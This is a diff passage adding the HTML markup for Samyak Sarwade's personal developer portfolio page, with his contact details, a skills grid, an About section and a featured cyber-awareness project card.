@@ -1,0 +1,1079 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Samyak Sarwade | Software Developer & Computer Engineer</title>
+  <meta name="description" content="Portfolio of Samyak Sarwade - Computer Engineering Student, Software Developer specializing in Java, Python, React, Cloud & AI/ML.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&family=Caveat:wght@600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="styles/main.css">
+  <link rel="stylesheet" href="styles/components.css">
+  <link rel="stylesheet" href="styles/animations.css">
+</head>
+<body class="dark-theme">
+  <!-- Interactive Background Canvas -->
+  <canvas id="bg-canvas" aria-hidden="true"></canvas>
+  <div class="ambient-glow" aria-hidden="true"></div>
+
+  <!-- Toast Notification Container -->
+  <div id="toast-container" class="toast-container" aria-live="polite" aria-atomic="true"></div>
+
+  <!-- Header / Navigation -->
+  <header class="site-header" id="site-header">
+    <div class="nav-container">
+      <a href="#home" class="brand-logo" aria-label="Samyak Sarwade Home">
+        <span class="logo-badge">S</span>
+        <span class="logo-text">Samyak <span class="text-accent">Sarwade</span></span>
+      </a>
+
+      <nav class="desktop-nav" aria-label="Main Navigation">
+        <a href="#home" class="nav-link active">Home</a>
+        <a href="#about" class="nav-link">About</a>
+        <a href="#skills" class="nav-link">Skills</a>
+        <a href="#projects" class="nav-link">Projects</a>
+        <a href="#education" class="nav-link">Education</a>
+        <a href="#certifications" class="nav-link">Certifications</a>
+        <a href="#contact" class="nav-link">Contact</a>
+      </nav>
+
+      <div class="header-actions">
+        <!-- Theme Toggle Button (Light / Dark Mode) -->
+        <button id="theme-toggle-btn" class="icon-btn" aria-label="Toggle Dark/Light Mode" title="Toggle Dark/Light Mode">
+          <!-- Moon icon for Dark Mode -->
+          <svg class="theme-moon-icon" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+          </svg>
+          <!-- Sun icon for Light Mode -->
+          <svg class="theme-sun-icon hidden" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="5"></circle>
+            <line x1="12" y1="1" x2="12" y2="3"></line>
+            <line x1="12" y1="21" x2="12" y2="23"></line>
+            <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+            <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+            <line x1="1" y1="12" x2="3" y2="12"></line>
+            <line x1="21" y1="12" x2="23" y2="12"></line>
+            <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+            <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+          </svg>
+        </button>
+
+        <!-- Resume Download Button -->
+        <button id="header-resume-btn" class="btn btn-outline btn-sm resume-btn">
+          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+            <polyline points="7 10 12 15 17 10"></polyline>
+            <line x1="12" y1="15" x2="12" y2="3"></line>
+          </svg>
+          <span>Download Resume</span>
+        </button>
+
+        <!-- Mobile Menu Toggle -->
+        <button id="mobile-menu-btn" class="mobile-toggle-btn" aria-label="Toggle Navigation Menu">
+          <span></span>
+          <span></span>
+          <span></span>
+        </button>
+      </div>
+    </div>
+
+    <!-- Mobile Dropdown Navigation -->
+    <div id="mobile-nav-menu" class="mobile-nav-menu">
+      <a href="#home" class="mobile-nav-link">Home</a>
+      <a href="#about" class="mobile-nav-link">About</a>
+      <a href="#skills" class="mobile-nav-link">Skills</a>
+      <a href="#projects" class="mobile-nav-link">Projects</a>
+      <a href="#education" class="mobile-nav-link">Education</a>
+      <a href="#certifications" class="mobile-nav-link">Certifications</a>
+      <a href="#contact" class="mobile-nav-link">Contact</a>
+      <button class="btn btn-primary btn-sm mobile-resume-trigger">Download Resume</button>
+    </div>
+  </header>
+
+  <!-- Main Content Layout -->
+  <main class="main-wrapper" id="home">
+    
+    <!-- Hero Section -->
+    <section class="hero-section">
+      <div class="hero-grid">
+        
+        <!-- Left Hero: Profile Card with Avatar on Left and Text on Right -->
+        <div class="hero-profile-card spotlight-card" data-tilt>
+          <div class="hero-profile-row">
+            
+            <!-- Avatar Column -->
+            <div class="avatar-column">
+              <div class="avatar-wrapper">
+                <!-- Concentric Tech Orbit Ring -->
+                <div class="orbital-ring" aria-hidden="true">
+                  <svg class="orbit-svg" viewBox="0 0 200 200">
+                    <circle class="orbit-circle-outer" cx="100" cy="100" r="95" fill="none" stroke="currentColor" stroke-width="1.2" stroke-dasharray="6 8"></circle>
+                    <circle class="orbit-circle-inner" cx="100" cy="100" r="86" fill="none" stroke="currentColor" stroke-width="1" stroke-dasharray="2 4" stroke-opacity="0.6"></circle>
+                    <circle class="orbit-circle-glow" cx="100" cy="100" r="78" fill="none" stroke="currentColor" stroke-width="1.5" stroke-opacity="0.3"></circle>
+                  </svg>
+                </div>
+
+                <!-- Avatar Image -->
+                <div class="avatar-image-container">
+                  <img src="assets/avatar.png" alt="Samyak Sarwade" class="avatar-img" id="avatar-img" />
+                  <div class="avatar-status-badge" title="Available for Opportunities">
+                    <span class="status-pulse"></span>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- Hero Details Column -->
+            <div class="hero-info-column">
+              <span class="greeting-badge">Hi, I'm</span>
+              <h1 class="hero-name">Samyak <span class="gradient-text">Sarwade</span></h1>
+              <h2 class="hero-title">Computer Engineering Student <span class="separator">|</span> Software Developer</h2>
+              <p class="hero-bio">
+                I'm a passionate and dedicated developer with hands-on experience in building web applications, working with modern technologies, and exploring the world of AI/ML and cloud computing.
+              </p>
+
+              <!-- Quick Contacts with Copy Interaction -->
+              <div class="hero-contact-row">
+                <button class="contact-pill-btn copy-btn" data-copy="9552280697" title="Click to copy phone number">
+                  <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
+                  </svg>
+                  <span class="pill-text">9552280697</span>
+                  <span class="copy-badge">Copy</span>
+                </button>
+
+                <button class="contact-pill-btn copy-btn" data-copy="samyaksarwade1105@gmail.com" title="Click to copy email address">
+                  <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
+                    <polyline points="22,6 12,13 2,6"></polyline>
+                  </svg>
+                  <span class="pill-text">samyaksarwade1105@gmail.com</span>
+                  <span class="copy-badge">Copy</span>
+                </button>
+              </div>
+
+              <!-- Social Links -->
+              <div class="hero-social-row">
+                <a href="https://github.com/SamyakSarwade" target="_blank" rel="noopener noreferrer" class="social-icon-btn" aria-label="GitHub Profile">
+                  <svg viewBox="0 0 24 24" width="17" height="17" fill="currentColor">
+                    <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
+                  </svg>
+                </a>
+                <a href="https://linkedin.com/in/samyak-sarwade" target="_blank" rel="noopener noreferrer" class="social-icon-btn" aria-label="LinkedIn Profile">
+                  <svg viewBox="0 0 24 24" width="17" height="17" fill="currentColor">
+                    <path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/>
+                  </svg>
+                </a>
+                <button class="social-icon-btn" id="hero-mail-direct-btn" aria-label="Send direct email" title="Send direct email">
+                  <svg viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
+                    <polyline points="22,6 12,13 2,6"></polyline>
+                  </svg>
+                </button>
+              </div>
+            </div>
+
+          </div>
+        </div>
+
+        <!-- Right Hero: Quote + Interactive 3D Laptop Studio -->
+        <div class="hero-laptop-container">
+          <!-- Handwritten quote with pointer arrow -->
+          <div class="handwritten-quote-wrapper">
+            <span class="quote-text">“ Turning ideas into real-world solutions through code. ”</span>
+            <svg class="curved-arrow-svg" viewBox="0 0 100 50">
+              <path d="M 10,10 Q 50,45 85,25" fill="none" stroke="currentColor" stroke-width="1.8" stroke-dasharray="3 3"/>
+              <polygon points="85,20 95,25 88,32" fill="currentColor" />
+            </svg>
+          </div>
+
+          <!-- Interactive 3D Laptop Code Studio -->
+          <div class="laptop-3d-wrapper" id="laptop-tilt-box">
+            <!-- Floating Tech Badges -->
+            <div class="floating-badge badge-code" title="Clean Code Architecture">
+              <span>&lt;/&gt;</span>
+            </div>
+            <div class="floating-badge badge-react" title="React.js Ecosystem">
+              <svg viewBox="0 0 24 24" width="22" height="22" fill="#38bdf8">
+                <path d="M12 9.5c1.38 0 2.5 1.12 2.5 2.5s-1.12 2.5-2.5 2.5-2.5-1.12-2.5-2.5 1.12-2.5 2.5-2.5zm0-2c-2.48 0-4.5 2.02-4.5 4.5s2.02 4.5 4.5 4.5 4.5-2.02 4.5-4.5-2.02-4.5-4.5-4.5zm0-5.5c-4.88 0-9.28 1.48-11.23 3.84-.28.34-.23.84.11 1.12.34.28.84.23 1.12-.11C3.69 4.8 7.6 3.5 12 3.5c4.4 0 8.31 1.3 10 3.35.28.34.78.39 1.12.11.34-.28.39-.78.11-1.12C21.28 3.48 16.88 2 12 2z"/>
+              </svg>
+            </div>
+            <div class="floating-badge badge-java" title="Java Enterprise Backend">
+              <span class="badge-text-java">☕</span>
+            </div>
+            <div class="floating-badge badge-python" title="Python & AI/ML">
+              <svg viewBox="0 0 24 24" width="22" height="22" fill="#cbd5e1">
+                <path d="M11.9 2c-3.1 0-5.3.3-5.3 2.1 0 1.8 1.3 2.2 3.3 2.2h2.2v1.1H6.7C4.6 7.4 3 8.7 3 11.2c0 2.6 1.8 3.8 3.7 3.8h1.4v-2c0-1.5 1.2-2.8 2.7-2.8h4.2c1.2 0 2.2-1 2.2-2.2V4.1C17.2 2.4 15 2 11.9 2zm-1.8 1.6c.4 0 .8.3.8.8 0 .4-.4.8-.8.8s-.8-.4-.8-.8c0-.5.4-.8.8-.8z"/>
+              </svg>
+            </div>
+
+            <!-- Laptop Physical Frame -->
+            <div class="laptop-screen-frame">
+              <div class="laptop-camera-notch"></div>
+              
+              <!-- Interactive Code Editor Screen -->
+              <div class="laptop-display">
+                <!-- Editor Topbar & Tabs -->
+                <div class="editor-header">
+                  <div class="editor-controls">
+                    <span class="control-dot red"></span>
+                    <span class="control-dot yellow"></span>
+                    <span class="control-dot green"></span>
+                  </div>
+                  <div class="editor-tabs">
+                    <button class="editor-tab active" data-file="developer">
+                      <span class="file-icon">☕</span>
+                      <span>Developer.java</span>
+                    </button>
+                    <button class="editor-tab" data-file="threat">
+                      <span class="file-icon">🛡️</span>
+                      <span>ThreatEngine.py</span>
+                    </button>
+                    <button class="editor-tab" data-file="skills">
+                      <span class="file-icon">⚡</span>
+                      <span>stack.json</span>
+                    </button>
+                  </div>
+                  <div class="editor-run-btn" id="editor-run-snippet" title="Execute Snippet">
+                    <svg viewBox="0 0 24 24" width="12" height="12" fill="currentColor">
+                      <polygon points="5 3 19 12 5 21 5 3"></polygon>
+                    </svg>
+                    <span>Run</span>
+                  </div>
+                </div>
+
+                <!-- Code Screen Body -->
+                <div class="editor-body">
+                  <div class="editor-gutter" id="editor-gutter">
+                    <span>1</span><span>2</span><span>3</span><span>4</span><span>5</span><span>6</span><span>7</span><span>8</span><span>9</span><span>10</span>
+                  </div>
+                  <pre class="editor-code"><code id="code-stream"></code><span class="typing-cursor">|</span></pre>
+                </div>
+
+                <!-- Mini Status Bar -->
+                <div class="editor-status-bar">
+                  <span class="status-left">✓ Ready • UTF-8 • Java 21</span>
+                  <span class="status-right">Active</span>
+                </div>
+              </div>
+            </div>
+            <!-- Laptop Base Stand -->
+            <div class="laptop-base">
+              <div class="laptop-notch"></div>
+            </div>
+            <div class="laptop-glow-reflection"></div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Bento Grid Section -->
+    <section class="bento-grid-section" id="bento-grid">
+      
+      <!-- Bento Card 1: Technical Skills -->
+      <article class="bento-card card-skills spotlight-card" id="skills" data-tilt>
+        <div class="card-header">
+          <div class="card-title-group">
+            <span class="card-icon-box">
+              <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <polyline points="16 18 22 12 16 6"></polyline>
+                <polyline points="8 6 2 12 8 18"></polyline>
+              </svg>
+            </span>
+            <div>
+              <h2 class="card-title">Technical Skills</h2>
+              <p class="card-subtitle">Technologies and tools I work with</p>
+            </div>
+          </div>
+          <button class="btn-link-action modal-trigger" data-modal="skills-modal" id="view-all-skills-btn">
+            <span>View All Skills</span>
+            <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <line x1="5" y1="12" x2="19" y2="12"></line>
+              <polyline points="12 5 19 12 12 19"></polyline>
+            </svg>
+          </button>
+        </div>
+
+        <!-- Skills Filter Bar & Search -->
+        <div class="skills-interactive-bar">
+          <div class="skills-filter-pills" id="skills-filter-container">
+            <button class="filter-pill active" data-filter="all">All</button>
+            <button class="filter-pill" data-filter="languages">Languages</button>
+            <button class="filter-pill" data-filter="frameworks">Frameworks</button>
+            <button class="filter-pill" data-filter="cloud">Cloud & DevOps</button>
+            <button class="filter-pill" data-filter="aiml">AI / ML</button>
+            <button class="filter-pill" data-filter="databases">Databases</button>
+          </div>
+          <div class="skills-search-box">
+            <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2">
+              <circle cx="11" cy="11" r="8"></circle>
+              <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+            </svg>
+            <input type="text" id="skills-search-input" placeholder="Quick find skill..." aria-label="Search skills" />
+          </div>
+        </div>
+
+        <!-- Grid of Skill Cards -->
+        <div class="skills-cards-grid" id="skills-grid">
+          
+          <!-- Languages -->
+          <div class="skill-group-card" data-category="languages" data-keywords="java python c c++ sql">
+            <div class="group-icon-pill">
+              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2">
+                <polyline points="4 7 4 4 20 4 20 7"></polyline>
+                <line x1="9" y1="20" x2="15" y2="20"></line>
+                <line x1="12" y1="4" x2="12" y2="20"></line>
+              </svg>
+            </div>
+            <div class="group-content">
+              <h3 class="group-title">Languages</h3>
+              <p class="group-items">Java, Python, C, C++, SQL</p>
+            </div>
+          </div>
+
+          <!-- Frameworks & Libraries -->
+          <div class="skill-group-card" data-category="frameworks" data-keywords="react reactjs spring microservices rest api hibernate jpa jdbc">
+            <div class="group-icon-pill">
+              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2">
+                <polygon points="12 2 2 7 12 12 22 7 12 2"></polygon>
+                <polyline points="2 17 12 22 22 17"></polyline>
+                <polyline points="2 12 12 17 22 12"></polyline>
+              </svg>
+            </div>
+            <div class="group-content">
+              <h3 class="group-title">Frameworks & Libraries</h3>
+              <p class="group-items">React.js, Spring, Microservices, REST APIs, Hibernate, JPA, JDBC</p>
+            </div>
+          </div>
+
+          <!-- Version Control -->
+          <div class="skill-group-card" data-category="tools" data-keywords="git github version control">
+            <div class="group-icon-pill">
+              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2">
+                <circle cx="18" cy="18" r="3"></circle>
+                <circle cx="6" cy="6" r="3"></circle>
+                <path d="M13 6h3a2 2 0 0 1 2 2v7"></path>
+                <line x1="6" y1="9" x2="6" y2="21"></line>
+              </svg>
+            </div>
+            <div class="group-content">
+              <h3 class="group-title">Version Control</h3>
+              <p class="group-items">Git, Github</p>
+            </div>
+          </div>
+
+          <!-- Cloud & DevOps -->
+          <div class="skill-group-card" data-category="cloud" data-keywords="aws ec2 s3 cloud devops">
+            <div class="group-icon-pill">
+              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M18 10h-1.26A8 8 0 1 0 9 20h9a5 5 0 0 0 0-10z"></path>
+              </svg>
+            </div>
+            <div class="group-content">
+              <h3 class="group-title">Cloud & DevOps</h3>
+              <p class="group-items">AWS (EC2, S3)</p>
+            </div>
+          </div>
+
+          <!-- Web Server -->
+          <div class="skill-group-card" data-category="cloud" data-keywords="tomcat web server">
+            <div class="group-icon-pill">
+              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2">
+                <rect x="2" y="2" width="20" height="8" rx="2" ry="2"></rect>
+                <rect x="2" y="14" width="20" height="8" rx="2" ry="2"></rect>
+                <line x1="6" y1="6" x2="6.01" y2="6"></line>
+                <line x1="6" y1="18" x2="6.01" y2="18"></line>
+              </svg>
+            </div>
+            <div class="group-content">
+              <h3 class="group-title">Web Server</h3>
+              <p class="group-items">Tomcat</p>
+            </div>
+          </div>
+
+          <!-- Databases -->
+          <div class="skill-group-card" data-category="databases" data-keywords="oracledb oracle mysql mongodb sql">
+            <div class="group-icon-pill">
+              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2">
+                <ellipse cx="12" cy="5" rx="9" ry="3"></ellipse>
+                <path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"></path>
+                <path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"></path>
+              </svg>
+            </div>
+            <div class="group-content">
+              <h3 class="group-title">Databases</h3>
+              <p class="group-items">OracleDB, MySQL, MongoDB</p>
+            </div>
+          </div>
+
+          <!-- Testing & Tools -->
+          <div class="skill-group-card" data-category="tools" data-keywords="junit maven vs code vscode postman testing">
+            <div class="group-icon-pill">
+              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2">
+                <circle cx="12" cy="12" r="3"></circle>
+                <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path>
+              </svg>
+            </div>
+            <div class="group-content">
+              <h3 class="group-title">Testing & Tools</h3>
+              <p class="group-items">JUnit, Maven, VS Code, Postman</p>
+            </div>
+          </div>
+
+          <!-- AI / ML -->
+          <div class="skill-group-card" data-category="aiml" data-keywords="langchain langgraph rag llm prompt engineering ai ml">
+            <div class="group-icon-pill">
+              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M12 2a4 4 0 0 0-4 4c0 1.1.4 2.1 1.1 2.8C8 9.6 7 11.2 7 13c0 2.8 2.2 5 5 5s5-2.2 5-5c0-1.8-1-3.4-2.1-4.2.7-.7 1.1-1.7 1.1-2.8a4 4 0 0 0-4-4z"></path>
+                <circle cx="12" cy="13" r="2"></circle>
+              </svg>
+            </div>
+            <div class="group-content">
+              <h3 class="group-title">AI / ML</h3>
+              <p class="group-items">LangChain, LangGraph, RAG, LLM, Prompt Engineering</p>
+            </div>
+          </div>
+
+          <!-- Big Data -->
+          <div class="skill-group-card" data-category="databases" data-keywords="hadoop hdfs mapreduce hive big data">
+            <div class="group-icon-pill">
+              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path>
+              </svg>
+            </div>
+            <div class="group-content">
+              <h3 class="group-title">Big Data</h3>
+              <p class="group-items">Hadoop, HDFS, MapReduce, Hive</p>
+            </div>
+          </div>
+
+          <!-- Libraries -->
+          <div class="skill-group-card" data-category="languages" data-keywords="numpy pandas data science python">
+            <div class="group-icon-pill">
+              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2">
+                <rect x="3" y="3" width="7" height="7"></rect>
+                <rect x="14" y="3" width="7" height="7"></rect>
+                <rect x="14" y="14" width="7" height="7"></rect>
+                <rect x="3" y="14" width="7" height="7"></rect>
+              </svg>
+            </div>
+            <div class="group-content">
+              <h3 class="group-title">Libraries</h3>
+              <p class="group-items">Numpy, Pandas</p>
+            </div>
+          </div>
+
+        </div>
+      </article>
+
+      <!-- Bento Card 2: About Me -->
+      <article class="bento-card card-about spotlight-card" id="about" data-tilt>
+        <div class="card-header">
+          <div class="card-title-group">
+            <span class="card-icon-box">
+              <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+                <circle cx="12" cy="7" r="4"></circle>
+              </svg>
+            </span>
+            <div>
+              <h2 class="card-title">About Me</h2>
+            </div>
+          </div>
+        </div>
+
+        <div class="about-content">
+          <p class="about-description">
+            I am a 3rd year Computer Engineering student with a strong interest in software development, cloud computing and modern technologies. I enjoy solving problems, building scalable applications, and continuously learning new tools and frameworks to improve my skills and contribute to meaningful projects.
+          </p>
+
+          <!-- Animated Stat Counters -->
+          <div class="about-stats-grid">
+            <div class="stat-box">
+              <div class="stat-number-wrapper">
+                <span class="stat-number" data-target="5">0</span><span class="stat-suffix">+</span>
+              </div>
+              <span class="stat-label">Technologies</span>
+            </div>
+
+            <div class="stat-box">
+              <div class="stat-number-wrapper">
+                <span class="stat-number" data-target="2">0</span><span class="stat-suffix">+</span>
+              </div>
+              <span class="stat-label">Certifications</span>
+            </div>
+
+            <div class="stat-box">
+              <div class="stat-number-wrapper">
+                <span class="stat-number" data-target="1">0</span><span class="stat-suffix"></span>
+              </div>
+              <span class="stat-label">Major Project</span>
+            </div>
+
+            <div class="stat-box">
+              <div class="stat-number-wrapper">
+                <span class="stat-number" data-target="3">0</span><span class="stat-suffix">+</span>
+              </div>
+              <span class="stat-label">Months Internship</span>
+            </div>
+          </div>
+
+          <!-- Action Buttons -->
+          <div class="about-actions-row">
+            <a href="#contact" class="btn btn-primary" id="about-get-in-touch">
+              <span>Get in Touch</span>
+              <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <line x1="5" y1="12" x2="19" y2="12"></line>
+                <polyline points="12 5 19 12 12 19"></polyline>
+              </svg>
+            </a>
+
+            <button class="btn btn-secondary resume-btn" id="about-download-resume">
+              <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                <polyline points="7 10 12 15 17 10"></polyline>
+                <line x1="12" y1="15" x2="12" y2="3"></line>
+              </svg>
+              <span>Download Resume</span>
+            </button>
+          </div>
+        </div>
+      </article>
+
+      <!-- Bento Card 3: Featured Project -->
+      <article class="bento-card card-featured-project spotlight-card" id="projects" data-tilt>
+        <div class="card-header">
+          <div class="card-title-group">
+            <span class="card-icon-box">
+              <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path>
+              </svg>
+            </span>
+            <div>
+              <h2 class="card-title">Featured Project</h2>
+            </div>
+          </div>
+          <button class="btn-link-action modal-trigger" data-modal="projects-modal" id="view-all-projects-btn">
+            <span>View All Projects</span>
+            <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <line x1="5" y1="12" x2="19" y2="12"></line>
+              <polyline points="12 5 19 12 12 19"></polyline>
+            </svg>
+          </button>
+        </div>
+
+        <div class="featured-project-layout">
+          <!-- Project Cyber Visual Graphic & Interactive Threat Simulator Trigger -->
+          <div class="project-graphic-box">
+            <div class="cyber-shield-graphic">
+              <div class="shield-radar-pulse"></div>
+              <div class="shield-circuit-lines"></div>
+              <div class="shield-center-lock">
+                <svg viewBox="0 0 24 24" width="40" height="40" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+                  <circle cx="12" cy="11" r="2"></circle>
+                  <path d="M12 13v3"></path>
+                </svg>
+              </div>
+            </div>
+            <!-- Mini interactive indicator -->
+            <button class="interactive-test-badge" id="threat-simulator-trigger" title="Launch Interactive Threat Detection">
+              <span class="radar-dot"></span>
+              <span>Live Threat Radar</span>
+            </button>
+          </div>
+
+          <!-- Project Details -->
+          <div class="project-details">
+            <div class="project-title-row">
+              <h3 class="project-heading">Cyber Threat Awareness Portal</h3>
+              <a href="https://github.com/SamyakSarwade" target="_blank" rel="noopener noreferrer" class="external-icon-link" aria-label="Open Project Link">
+                <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
+                  <polyline points="15 3 21 3 21 9"></polyline>
+                  <line x1="10" y1="14" x2="21" y2="3"></line>
+                </svg>
+              </a>
+            </div>
+
+            <p class="project-desc">
+              A web platform to educate users about cyber threats through quizzes, videos and real-time threat intelligence. Built to raise security posture and train people against modern attack vectors.
+            </p>
+
+            <!-- Tech Tag Pills -->
+            <div class="project-tags-row">
+              <span class="tech-tag">Python</span>
+              <span class="tech-tag">HTML</span>
+              <span class="tech-tag">CSS</span>
+              <span class="tech-tag">JS</span>
+              <span class="tech-tag">Firebase</span>
+            </div>
+
+            <!-- Project Actions -->
+            <div class="project-action-row">
+              <a href="https://github.com/SamyakSarwade" target="_blank" rel="noopener noreferrer" class="btn btn-secondary btn-sm">
+                <svg viewBox="0 0 24 24" width="15" height="15" fill="currentColor">
